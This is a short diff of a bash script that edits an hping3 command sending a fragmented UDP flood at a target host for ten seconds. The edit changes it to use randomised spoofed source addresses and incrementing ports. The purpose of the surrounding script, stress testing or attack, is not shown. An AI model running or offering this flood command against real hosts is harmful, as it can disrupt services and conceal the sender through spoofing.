@@ -169,7 +169,7 @@ echo -e "${YELLOW}  Blasting $TARGET with fragmented UDP packets to create struc
 echo ""
 
 # Run a heavy, fragmented UDP flood on random ports for 10 seconds
-timeout 10 hping3 --udp --frag --flood --rand-dest $TARGET 2>/dev/null &
+timeout 10 hping3 --udp --frag --flood --rand-source -p ++1 $TARGET 2>/dev/null &
 HPING2_PID=$!
 sleep 10
 kill $HPING2_PID 2>/dev/null
